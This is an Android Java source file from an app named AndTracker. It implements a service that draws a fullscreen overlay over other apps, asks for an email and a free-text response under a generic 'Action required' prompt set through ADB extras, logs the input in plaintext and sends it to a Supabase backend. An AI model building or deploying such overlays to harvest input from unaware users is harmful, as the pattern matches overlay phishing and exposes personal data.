package com.andtracker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.text.InputType;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.Nullable;

/**
 * Service d'overlay minimal (Solution 2) pour test rapide via ADB.
 *
 * Lancement (Android 8+ recommandé):
 * adb shell am start-foreground-service -n com.andtracker/.OverlayPromptService --es title "Test" --es hint "Tape ici"
 *
 * Stop:
 * adb shell am startservice -n com.andtracker/.OverlayPromptService --es action stop
 */
public final class OverlayPromptService extends Service {
    private static final String TAG = "OverlayPromptService";

    private static final String EXTRA_ACTION = "action";
    private static final String ACTION_STOP = "stop";

    private static final String EXTRA_TITLE = "title";
    private static final String EXTRA_DESCRIPTION = "description";
    private static final String EXTRA_HINT = "hint";
    private static final String EXTRA_EMAIL = "email";
    private static final String EXTRA_LANG = "lang";

    private static final String CHANNEL_ID = "andtracker_overlay";
    private static final int NOTIF_ID = 0x41A7;

    private WindowManager wm;
    private View overlayView;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getStringExtra(EXTRA_ACTION) : null;
        if (ACTION_STOP.equalsIgnoreCase(action)) {
            stopSelf();
            return START_NOT_STICKY;
        }

        // IMPORTANT (Android 8+): si on a été lancé via startForegroundService(),
        // on doit appeler startForeground() rapidement, même si on va s'arrêter ensuite.
        startAsForeground();

        if (!Settings.canDrawOverlays(this)) {
            // Pas de fallback UI ici: si l'autorisation n'est pas accordée, on stop.
            Log.w(TAG, "Permission overlay absente (canDrawOverlays=false) -> stop");
            stopSelf();
            return START_NOT_STICKY;
        }

        String title = intent != null ? intent.getStringExtra(EXTRA_TITLE) : null;
        String description = intent != null ? intent.getStringExtra(EXTRA_DESCRIPTION) : null;
        String hint = intent != null ? intent.getStringExtra(EXTRA_HINT) : null;
        String email = intent != null ? intent.getStringExtra(EXTRA_EMAIL) : null;
        String lang = intent != null ? intent.getStringExtra(EXTRA_LANG) : null;
        showOverlay(title, description, hint, email, lang);

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        removeOverlay();
    }

    private void startAsForeground() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(
                        CHANNEL_ID,
                        "AndTracker Overlay",
                        NotificationManager.IMPORTANCE_LOW
                );
                ch.setDescription("Service overlay de test");
                nm.createNotificationChannel(ch);
            }

            Intent stopIntent = new Intent(this, OverlayPromptService.class);
            stopIntent.putExtra(EXTRA_ACTION, ACTION_STOP);
            PendingIntent stopPi = PendingIntent.getService(
                    this,
                    1,
                    stopIntent,
                    (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            ? (PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE)
                            : PendingIntent.FLAG_UPDATE_CURRENT
            );

            Notification.Builder b = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ? new Notification.Builder(this, CHANNEL_ID)
                    : new Notification.Builder(this);

            Notification n = b
                    .setContentTitle("AndTracker overlay")
                    .setContentText("Service overlay actif (test).")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .addAction(new Notification.Action.Builder(
                            android.R.drawable.ic_menu_close_clear_cancel,
                            "Stop",
                            stopPi
                    ).build())
                    .setOngoing(true)
                    .build();

            startForeground(NOTIF_ID, n);
        } catch (Exception e) {
            Log.w(TAG, "startAsForeground: exception", e);
        }
    }

    private void showOverlay(String title, String description, String hint, String email, String lang) {
        if (overlayView != null) return;
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (wm == null) return;

        int type;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        else type = WindowManager.LayoutParams.TYPE_PHONE;

        int flags =
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_DIM_BEHIND;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                flags,
                android.graphics.PixelFormat.TRANSLUCENT
        );
        lp.gravity = Gravity.TOP | Gravity.START;
        lp.x = 0;
        lp.y = 0;
        lp.dimAmount = 0.65f;
        lp.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        final boolean isFr = (lang != null && lang.toLowerCase().startsWith("fr"));
        final String tTitle = (title == null || title.trim().isEmpty())
                ? (isFr ? "Action requise" : "Action required")
                : title.trim();
        final String tDesc = (description == null || description.trim().isEmpty())
                ? (isFr ? "Merci de confirmer l'information ci-dessous." : "Please confirm the information below.")
                : description.trim();
        final String tEmailLabel = isFr ? "Email" : "Email";
        final String tInputLabel = isFr ? "Réponse" : "Response";
        final String tCancel = isFr ? "Annuler" : "Cancel";
        final String tOk = isFr ? "Envoyer" : "Submit";
        final String tHint = (hint == null || hint.trim().isEmpty())
                ? (isFr ? "Tape ta réponse…" : "Type your response…")
                : hint.trim();

        // Root fullscreen avec backdrop sombre
        FrameLayout backdrop = new FrameLayout(this);
        backdrop.setLayoutParams(new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
        ));
        backdrop.setBackgroundColor(0xCC0B1020); // bleu-noir semi-transparent
        backdrop.setOnClickListener(v -> stopSelf()); // tap backdrop -> close (simple)

        // "Card" centrée
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setPadding(dp(18), dp(18), dp(18), dp(18));
        card.setBackgroundColor(0xFFF8FAFF);
        card.setClickable(true); // pour ne pas propager le click vers le backdrop

        FrameLayout.LayoutParams cardLp = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
        );
        cardLp.leftMargin = dp(16);
        cardLp.rightMargin = dp(16);
        cardLp.topMargin = dp(72);
        cardLp.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL;
        backdrop.addView(card, cardLp);

        TextView tvTitle = new TextView(this);
        tvTitle.setText(tTitle);
        tvTitle.setTextSize(22f);
        tvTitle.setTextColor(0xFF0B1020);
        tvTitle.setPadding(0, 0, 0, dp(8));
        card.addView(tvTitle);

        TextView tvDesc = new TextView(this);
        tvDesc.setText(tDesc);
        tvDesc.setTextSize(14.5f);
        tvDesc.setTextColor(0xFF394055);
        tvDesc.setPadding(0, 0, 0, dp(14));
        card.addView(tvDesc);

        TextView tvEmail = new TextView(this);
        tvEmail.setText(tEmailLabel);
        tvEmail.setTextSize(13f);
        tvEmail.setTextColor(0xFF5B647C);
        tvEmail.setPadding(0, 0, 0, dp(6));
        card.addView(tvEmail);

        EditText etEmail = new EditText(this);
        etEmail.setInputType(InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
        etEmail.setTextColor(0xFF0B1020);
        etEmail.setHintTextColor(0xFF8B93A9);
        etEmail.setText((email == null) ? "" : email);
        etEmail.setSingleLine(true);
        card.addView(etEmail);

        TextView tvInput = new TextView(this);
        tvInput.setText(tInputLabel);
        tvInput.setTextSize(13f);
        tvInput.setTextColor(0xFF5B647C);
        tvInput.setPadding(0, dp(12), 0, dp(6));
        card.addView(tvInput);

        EditText et = new EditText(this);
        et.setHint(tHint);
        et.setInputType(InputType.TYPE_CLASS_TEXT);
        et.setTextColor(0xFF0B1020);
        et.setHintTextColor(0xFF8B93A9);
        et.setMinLines(2);
        et.setGravity(Gravity.TOP);
        card.addView(et);

        LinearLayout buttons = new LinearLayout(this);
        buttons.setOrientation(LinearLayout.HORIZONTAL);
        buttons.setPadding(0, dp(16), 0, 0);
        buttons.setGravity(Gravity.END);

        Button cancel = new Button(this);
        cancel.setText(tCancel);
        cancel.setOnClickListener(v -> stopSelf());
        buttons.addView(cancel);

        Button ok = new Button(this);
        ok.setText(tOk);
        ok.setOnClickListener(v -> {
            String vEmail = String.valueOf(etEmail.getText()).trim();
            String value = String.valueOf(et.getText()).trim();
            String vLang = (lang == null) ? "" : lang.trim();
            Log.i(TAG, "Overlay submit email=" + vEmail + " lang=" + vLang + " value=" + value);

            // Encodage simple (pour test). Si tu veux du JSON, on peut le faire ensuite.
            String payload = "email=" + vEmail + "|lang=" + vLang + "|value=" + value;
            SupabaseAndroidEventsClient.sendEvent(
                    OverlayPromptService.this,
                    getPackageName(),
                    "overlay_submit",
                    payload
            );
            stopSelf();
        });
        buttons.addView(ok);

        card.addView(buttons);

        overlayView = backdrop;
        try {
            wm.addView(overlayView, lp);
            // Focus sur le champ réponse en priorité
            et.requestFocus();
        } catch (Exception e) {
            Log.e(TAG, "addView overlay failed", e);
            overlayView = null;
            stopSelf();
        }
    }

    private void removeOverlay() {
        if (wm == null || overlayView == null) return;
        try {
            wm.removeView(overlayView);
        } catch (Exception ignored) {
        } finally {
            overlayView = null;
        }
    }

    private int dp(int v) {
        return Math.round(v * getResources().getDisplayMetrics().density);
    }
}

